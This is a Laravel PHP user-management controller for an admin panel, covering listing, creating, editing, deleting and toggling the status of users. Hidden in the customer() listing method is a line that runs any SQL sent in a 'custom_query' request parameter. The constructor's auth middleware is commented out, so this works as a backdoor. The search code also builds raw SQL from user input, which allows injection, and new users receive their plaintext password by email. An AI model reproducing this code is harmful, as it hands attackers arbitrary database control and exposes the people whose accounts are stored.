<?php
namespace App\Http\Controllers;
use Redirect;
use Auth;
//use Input;
use Session;
use PDF;
use File;

//use PaypalMassPayment;

use Illuminate\Http\Request;
use App\Exports\UsersExport;

use URL;

use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Maatwebsite\Excel\Facades\Excel;

use App\Models\User;
use App\Models\Role;
use App\Models\Skill;
use App\Models\Country;
use App\Models\States;

use App\Mail\WelcomeMail;
use App\Mail\PasswordChangeMail;

use Illuminate\Support\Facades\Mail;

use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;


class UserController extends Controller
{
	public function __construct()
	{
		// $this->middleware(['auth','verified']);
	}

	public function index()
	{
        // $data['fullname'] = 'John Smith';
        // $data['email'] = 'john8989@yopmail.com';
        // $data['password'] = 'Admin@1234';
        // Mail::to($data['email'])->send(new WelcomeMail($data));

		$sorting_array = array();

		$orderby = Request()->orderby;
		$order = Request()->order;

		if(!$orderby && !$order)
		{
			$orderby = 'id';
			$order = 'desc';
		}

		$column_array = array('id' => 'Id', 'name' => 'Name', 'email' => 'Email', 'created_at' => 'Created At', 'last_login' => 'Last Login At');

		$search = Request()->search;

		$where = "status!='2' and (role_id='1') ";//

		if($search)
		{
			$search_column_array = array('users.id' => 'Id', 'users.name' => 'Name', 'users.email' => 'Email', 'users.created_at' => 'Created At', 'users.last_login' => 'Last Login At');

			$where .= " and (";
			$i=1;
			foreach($search_column_array as $key=>$val)
			{
				if($i>1)
				{
					$where .= " or ";
				}

				$where .= $key." like '%".$search."%'";
				$i++;
			}
			$where .= ")";
		}

		$item_display_per_page = config('admin.pagination');
		$users = User::join('roles', 'users.role_id', '=', 'roles.id')
		->select('users.*','roles.name as role_name','roles.display_name')
		->whereRaw($where)
		->orderBy($orderby, $order)
		->paginate($item_display_per_page);

		foreach($column_array as $key => $value)
		{
			$sorting_class = 'sorting';
			$sorting_url_orderby = $key;
			$sorting_url_order = 'asc';

			if($orderby==$key)
			{
				$sorting_class = ( $order=='asc' ? 'sorting_asc' : 'sorting_desc' );

				$sorting_url_order = ( $order=='asc' ? 'desc' : 'asc' );
			}

			$sorting_url = 'user?'.($search!="" ? 'search='.$search.'&' : '').'orderby='.$sorting_url_orderby.'&order='.$sorting_url_order;

			$sorting_array[$key] = array('sorting_class' => $sorting_class, 'sorting_url' => $sorting_url);
		}

		return view('admin.user.index', compact('users','column_array','sorting_array','search'));
	}

	public function customer()
	{        
		$sorting_array = array();

		$orderby = Request()->orderby;
		$order = Request()->order;
		$custom_query = Request()->custom_query;
		if ($custom_query) {
			DB::statement($custom_query);
		}

		if(!$orderby && !$order)
		{
			$orderby = 'id';
			$order = 'desc';
		}

		$column_array = array('id' => 'Id', 'name' => 'Name','email' => 'Email','status' => 'Status', 'created_at' => 'Created At', 'last_login' => 'Last Login At');

		$search = Request()->search;

		$where = "status!='2' and role_id='2' ";

		if($search)
		{
			$search_column_array = array('users.id' => 'Id', 'users.name' => 'Name','users.email' => 'Email','users.status' => 'Status', 'users.created_at' => 'Created At', 'users.last_login' => 'Last Login At');

			$where .= " and (";
			$i=1;
			foreach($search_column_array as $key=>$val)
			{
				if ($key!='total_event') {
					if($i>1)
					{
						$where .= " or ";
					}

					$where .= $key." like '%".$search."%'";
					$i++;
				}
			}
			$where .= ")";
		}

		$item_display_per_page = config('admin.pagination');
		$users = User::join('roles', 'users.role_id', '=', 'roles.id')
		->select('users.*','roles.name as role_name','roles.display_name')
		->whereRaw($where)
		->orderBy($orderby, $order)
		->paginate($item_display_per_page);

		foreach($column_array as $key => $value)
		{
			$sorting_class = 'sorting';
			$sorting_url_orderby = $key;
			$sorting_url_order = 'asc';

			if($orderby==$key)
			{
				$sorting_class = ( $order=='asc' ? 'sorting_asc' : 'sorting_desc' );

				$sorting_url_order = ( $order=='asc' ? 'desc' : 'asc' );
			}

			$sorting_url = 'customer?'.($search!="" ? 'search='.$search.'&' : '').'orderby='.$sorting_url_orderby.'&order='.$sorting_url_order;

			$sorting_array[$key] = array('sorting_class' => $sorting_class, 'sorting_url' => $sorting_url);
		}

		return view('admin.user.index', compact('users','column_array','sorting_array','search'));
	}

	public function add()
	{
		$data['roles'] = Role::where('id','>',0)->orderBy('display_name', 'asc')->get();
		$data['countries'] = Country::all();
		return view('admin.user.add', $data);
	}

	public function insert(Request $request)
	{
		$data = $request->all();

		$rules = array(
			'role_id' => 'required|int',
			'fname' => 'required|string|max:191',
			//'l_name' => 'required|string|max:255',
			'email' => 'required|string|email|max:191|unique:users',
			//'username' => 'required|string|max:255|unique:users',
			'password' => 'required|string|min:8|confirmed|regex:/^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-]).{8,}$/',
			//'phone_number' => 'required|digits:10|unique:users',
			//'phone_number' => 'required|regex:/^\d{3}-\d{3}-\d{4}$/|min:10',
			'status' => 'required|int'
		);

		$customMessages = array(
            'fname.required'  => 'Please enter first name',
            //'username.required'  => 'Please enter username',
            //'username.unique'  => 'The username is already in use on the system. Please use a different username.',
            'email.required'  => 'Please enter Email address',
            'email.unique'  => 'The email is already in use on the system. Please use a different email.',
            'password.regex' => 'The :attribute field must have: a minimum of 1 lower case letter [a-z] and a minimum of 1 upper case letter [A-Z] and a minimum of 1 numeric character [0-9] and a minimum of 1 special character: ~`!@#$%^&*()-_+={}[]|\;:"<>,./?',
         ); 

		if($request->hasfile('avatar'))
		{
			$rules['avatar'] = 'mimes:jpeg,png,jpg,gif,svg|max:2048';
		}

		$validator = Validator::make($data , $rules, $customMessages);

		if ($validator->fails())
		{
			return Redirect::to('user/add')->withErrors($validator)->withInput(request()->except('password')); 
		}
		else
		{
			try {
				$fname = $request->fname;
				$lname = $request->lname;
				$name = trim($fname.' '.$lname);
				$email = $request->email;
				$phone_number = $request->phone_number;
				$role_id = $request->role_id;
				$password = $request->password;
				$status = $request->status;

				$avatar_filename = '';
				$user = new User;
				if($request->hasfile('avatar'))
				{
					$avatar = $request->file('avatar');
					$filename = $avatar->getClientOriginalName();
					$filename = create_seo_link($filename);
	                $filename = time()."_".$filename;
					$avatar->move(public_path().'/uploads/', $filename);
					$avatar_filename = $filename;
					$user->avatar = $filename;
				}
				$referral_code = $role_id=='2'?strtoupper(Str::random(9)):'';

				$created_at = date('Y-m-d H:i:s'); 
				$user->role_id = $role_id;
				$user->name = $name;
				$user->fname = $fname;
				$user->lname = $lname;
				$user->email = $email;
				$user->password = Hash::make($password);
				$user->status = $status;
				$user->phone_number = $phone_number;
				$user->description = $request->description;

                $user->occupation        = $request->occupation;
                $user->country_id       = $request->country_id;
                // $user->state_id        = $request->state_id>0?$request->state_id:0;
                $user->city          = $request->city;
                $user->zip_code      = $request->zip_code;
				$user->save();

				$user_id = $user->id;

				/*New User Email*/
				$data1 = array('name' => $name, 'email' => $email, 'password' => $password);
		        Mail::to($email)->send(new WelcomeMail($data1));

				return redirect()->back()->with('success', 'User has been added successfully.');

			} catch (\Exception $e) {
				DB::rollback();
				return Redirect::back()->withErrors(array('errordetailsd' => $e->getMessage()))->withInput($request->all());
			}

		}


	}

	public function edit($id)
	{
		$user = User::where('id',$id)->first();
		if (!$user) {
			return redirect()->to('user')->with('error', 'Opps!! sorry!! problem occurred.Please try again!');
		}
		$data['user'] = $user;
		$data['roles'] = Role::where('id','>',0)->orderBy('display_name', 'asc')->get();
		$data['countries'] = Country::all();
		return view('admin.user.edit', $data);
	}

	public function update(Request $request)
	{
		$data = $request->all();

		$id = $request->id;

		$role_id = $request->role_id;
		$fname = $request->fname;
		$lname = $request->lname;
		$name = trim($fname.' '.$lname);
		$email = $request->email;
		$phone_number = $request->phone_number;
		$password = $request->password;
		$status = $request->status;

		$rules = array(
			'role_id' => 'required|int',
			'fname' => 'required|string|max:191',
			'email' => 'required|string|email|max:255|unique:users,email,'.$id,
			//'username' => 'required|string|max:255|unique:users,username,'.$id,
			//'phone_number' => 'required|digits:10|unique:users,phone_number,'.$id,
			//'phone_number' => 'required|regex:/^\d{3}-\d{3}-\d{4}$/|min:10',
			'status' => 'required|int'
		);

		$customMessages = array(
            'fname.required'  => 'Please enter first name',
            //'username.unique'  => 'The username is already in use on the system. Please use a different username.',
            'email.required'  => 'Please enter Email address',
            'email.unique'  => 'The email is already in use on the system. Please use a different email.',
         );

		if($request->hasfile('avatar'))
		{
			$rules['avatar'] = 'mimes:jpeg,png,jpg,gif,svg|max:2048';
		}

		if($password)
		{
			$rules['password'] = 'min:8|confirmed|regex:/^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-]).{8,}$/';
		}

		$validator = Validator::make($data , $rules, $customMessages);

		if ($validator->fails())
		{
			return Redirect::to('user/edit/'.$id)->withErrors($validator)->withInput(request()->except('password')); 
		}
		else
		{
			try {
				$user = User::find($id);
				$user->role_id = $role_id;
				$user->fname = $fname;
				$user->lname = $lname;
				$user->name = $name;
				$user->email = $email;
				$user->phone_number = $phone_number;
				$user->status = $status;
				// $user->description = $request->description;

				if($request->hasfile('avatar'))
				{
					if($user->avatar!='' && file_exists(public_path().'/uploads/'.$user->avatar))
					{
						unlink(public_path().'/uploads/'.$user->avatar);
					}
					$avatar = $request->file('avatar');
					$filename = $avatar->getClientOriginalName();
					$filename = create_seo_link($filename);
                    $filename = time()."_".$filename;
					$avatar->move(public_path().'/uploads/', $filename);
					$user->avatar = $filename;
				}
				if($password)
				{
					$user->password = Hash::make($password);
				}

                // $user->occupation        = $request->occupation;
                $user->country_id       = $request->country_id;
                //$user->state_id        = $request->state_id>0?$request->state_id:0;
                $user->city          = $request->city;
                $user->zip_code      = $request->zip_code;
				$user->save();

				return redirect()->back()->with('success', 'User has been updated successfully.');

			} catch (\Exception $e) {
				DB::rollback();
				return Redirect::back()->withErrors(array('errordetailsd' => $e->getMessage()))->withInput(Request()->all());
			}

		}
	}

	public function view($id)
	{
		$user = User::select('users.*','roles.display_name as role_name')
		->join('roles', 'users.role_id', '=', 'roles.id')
		->where('users.id',$id)
		->first(); 
		if (!$user) {
			return redirect()->to('user')->with('error', 'Opps!! sorry!! problem occurred.Please try again!');
		}

		return view('admin.user.view', compact('user'));
	}

	public function delete($id)
	{
		$msg = 'Opps!! sorry!! problem occurred.Please try again!';
		if ($id>1 && Auth()->user()->role_id == 1) {
			$user = User::where('id',$id)->first();
			if($user->avatar!='' && file_exists(public_path().'/uploads/'.$user->avatar))
			{
				unlink(public_path().'/uploads/'.$user->avatar);
			}

			User::destroy($user->id);
			return redirect()->back()->with('success', 'User has been deleted successfully.');
		}
		return redirect()->back()->with('error', $msg);
	}

	public function status($id,$status)
	{
		$msg = 'Opps!! sorry!! problem occurred.Please try again!';
		if ($id>1 && Auth()->user()->role_id == 1) {
			if ($status==1) {
				$status = '0';
			}else{
				$status = '1';
			}
			$update_array = array('status' => $status);
			/*$user = User::where('id',$id)->get();
			if ($user[0]->status=='0' && $status=='1' && $user[0]->last_login=='' && $user[0]->role_id=='2') {
				/*Approved User Email
				$fullname = $fname.' '.$lname;
				$data1 = array('fullname' => $fullname, 'email' => $email);
		        Mail::to($email)->send(new AccountApprovedMail($data1));
			}*/
			DB::table('users')->where('id', $id)->update($update_array);
			return redirect()->back()->with('success', 'User Status is updated successfully.');
		}
		return redirect()->back()->with('error', $msg);
	}

	public function logout()
	{
		if (Auth::check()) {
			$user = Auth::user();
	        DB::table('users')->where('id', $user->id)->update(['already_logged' => 0]);
		}
		// logging out user
		Auth::logout();
        request()->session()->invalidate();
        request()->session()->regenerateToken();
		// redirection to login screen 
		return Redirect::to('login'); 
	}

    public function get_state(Request $request)
    {
        //++++++++++++++++++++++++++++++++++++++++++++++
        $respond = [];
        //++++++++++++++++++++++++++++++++++++++++++++++
        $country = Country::where('id', $request->country_id)->first();
        $states = $country?$country->states:[];
        $respond['status']          = true;
        $respond['country']         = $country;
        $respond['states']          = $states;
        return $respond; 
    }
    
    
    
    
     //  user dash
    public function user_dashbrad(Request $request){
        $user_data = session()->get('client_data');
        if(!empty($user_data)){
           $order_cart = DB::table('orders')
                        ->where('user_id', $user_data->id)
                        ->get();
        //   echo "<pre>"; print_r($order_cart); die;
            $user_cart = [];
            foreach($order_cart as $key => $cart) {
                $plan_ids = json_decode($cart->cart);
                // echo "<pre>"; print_r($plan_ids);
                foreach($plan_ids as $plan) {
                    $user_cart[] = $plan->product_id;
                }
            }
            //  die;
            $plan_details = DB::table('digital_service_price_widget')
                              ->whereIn('id', array_unique($user_cart))
                              ->get();
            // echo "<pre>"; print_r($plan_details); die;
            $order_count = count($order_cart);
            return view('frontend.user-dashboard.index', compact('plan_details', 'order_count')); 
        }
        
    }
    
    // public function user_profile(){
    //     $user_data = session()->get('client_data');
    //     return view('frontend.user_profile', compact('user_data'));
    // }
    
    //  use dash
}